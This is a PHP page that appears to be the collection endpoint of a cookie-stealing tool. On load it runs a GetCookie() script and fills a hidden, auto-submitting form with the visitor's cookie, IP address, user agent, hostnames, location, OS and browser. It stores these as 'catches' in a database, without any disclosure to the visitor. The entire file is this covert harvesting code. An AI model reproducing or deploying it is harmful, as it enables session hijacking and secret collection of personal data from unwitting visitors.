<?php
	require_once("Core/init.php");

	$Database = new Database();

	$IPAddress = Client::GetIP();

	$UserAgent = Client::GetUserAgent();
	$LocalHostName = gethostname();
	$HostName = gethostbyaddr($IPAddress);
	$Location = Client::GetLocation($IPAddress);

	$OS = Client::GetOS($UserAgent);
	$Browser = Client::GetBrowser($UserAgent);

	if(Input::Exists()) {
		$Data = array(
			"id" => Hash::Make(),
			"cookie" => (Input::Get("cookie-value") !== null && !empty(Input::Get("cookie-value"))) ? Input::Get("cookie-value") : "No cookie set",
			"decoded_cookie" => (Input::Get("decoded-cookie") !== null && !empty(Input::Get("decoded-cookie"))) ? Input::Get("decoded-cookie") : "Nothing to decode",
			"ip_address" => Input::Get("ip-address"),
			"user_agent" => Input::Get("user-agent"),
			"local_hostname" => Input::Get("local-hostname"),
			"hostname" => Input::Get("hostname"),
			"location" => Input::Get("location"),
			"client_os" => Input::Get("client-os"),
			"client_browser" => Input::Get("client-browser"),
			"catch_date" => StringFormatter::GetDateTime()
		);

		$Database::Insert("catches", $Data);
	}
?>
<!DOCTYPE html>
<head>
	<title></title>
	<script src="JavaScript/Generic.js"></script>
</head>
<body onload="GetCookie();">
	<form id="catch-form" id="catch-form" method="post" action="">
		<input type="text" name="cookie-value" id="cookie-value" hidden />
		<input type="text" name="decoded-cookie" id="decoded-cookie" hidden />

		<input type="text" name="ip-address" id="ip-address" value="<?php echo ($IPAddress !== null) ? $IPAddress : "Unknown IP Address"; ?>" hidden />
		<input type="text" name="user-agent" id="user-agent" value="<?php echo ($UserAgent !== null) ? $UserAgent : "Unknown User Agent"; ?>" hidden />
		<input type="text" name="local-hostname" id="local-hostname" value="<?php echo ($LocalHostName !== false) ? $LocalHostName : "Unknown Local Hostname"; ?>" hidden />
		<input type="text" name="hostname" id="hostname" value="<?php echo ($HostName !== false) ? $HostName : "Unknown Host Name"; ?>" hidden />
		<input type="text" name="location" id="location" value="<?php echo ($Location !== null) ? $Location['full_location'] : "Unknown Location"; ?>" hidden />
		<input type="text" name="client-os" id="client-os" value="<?php echo ($OS !== null) ? $OS : "Unknown OS"; ?>" hidden />
		<input type="text" name="client-browser" id="client-browser" value="<?php echo ($Browser !== null) ? $Browser : "Unknown Browser"; ?>" hidden />
	</form>

	<button form="catch-form" name="submit" id="submit" style="display:none;"></button>
</body>
</html>
